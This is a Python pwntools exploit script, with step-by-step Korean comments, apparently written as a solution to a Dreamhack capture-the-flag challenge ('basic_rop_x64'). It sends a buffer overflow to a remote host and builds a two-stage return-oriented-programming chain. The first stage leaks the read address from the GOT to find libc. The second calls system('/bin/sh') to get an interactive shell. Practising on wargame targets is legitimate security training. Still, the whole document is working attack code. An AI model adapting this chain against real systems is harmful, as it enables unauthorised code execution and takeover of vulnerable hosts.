from pwn import *

# 원격 서버 연결
p = remote("host8.dreamhack.games", 23707)

# 바이너리 / libc 정보 읽기
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

# offset = buf(0x40) + saved rbp(0x8)
payload = b'A' * 0x40
payload += b'B' * 8

# ROP gadget
pop_rdi = 0x0000000000400883
pop_rsi = 0x0000000000400881   # pop rsi ; pop r15 ; ret

# PLT / GOT / main 주소
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

# libc 안에서의 offset
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
binsh_offset = next(libc.search(b"/bin/sh"))

# -------------------------
# Stage 1 : read 주소 leak
# -------------------------
# 목표:
# write(1, read_got, ? ) 형태로 read@got 안에 들어 있는
# 실제 read 주소를 출력해서 libc base를 계산한다.

# rdi = 1 (stdout)
payload += p64(pop_rdi)
payload += p64(1)

# rsi = read_got
# 이 가젯은 pop rsi ; pop r15 ; ret 이라서 값 2개가 필요하다.
# 여기서 마지막 8은 rdx가 아니라 r15로 들어간다.
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(8)

# write 호출
payload += p64(write_plt)

# leak 후 다시 main으로 돌아가서 두 번째 payload 입력받기
payload += p64(main)

p.send(payload)

# 원래 프로그램이 buf 앞 0x40 바이트를 먼저 출력하므로
# 우리가 넣은 A 64개를 먼저 받아서 버린다.
p.recvuntil(b'A' * 0x40)

# 그 다음 나오는 leak된 read 주소를 받는다.
# 보통 상위 2바이트는 0x0000이라 6바이트만 받고 뒤에 붙여서 복원
read = u64(p.recvn(6) + b'\x00\x00')

# libc base 계산
libc_base = read - read_offset

# 실제 system, "/bin/sh" 주소 계산
system = libc_base + system_offset
binsh = libc_base + binsh_offset

# -------------------------
# Stage 2 : system("/bin/sh")
# -------------------------
exploit = b"A" * 0x40
exploit += b'B' * 8

# rdi에 "/bin/sh" 주소 넣기
exploit += p64(pop_rdi)
exploit += p64(binsh)

# system("/bin/sh") 호출
exploit += p64(system)

p.send(exploit)

# 두 번째 입력도 앞의 0x40 바이트가 먼저 출력되므로 그 부분 정리
p.recvuntil(b"A" * 0x40)

# 쉘 획득 후 상호작용
p.interactive()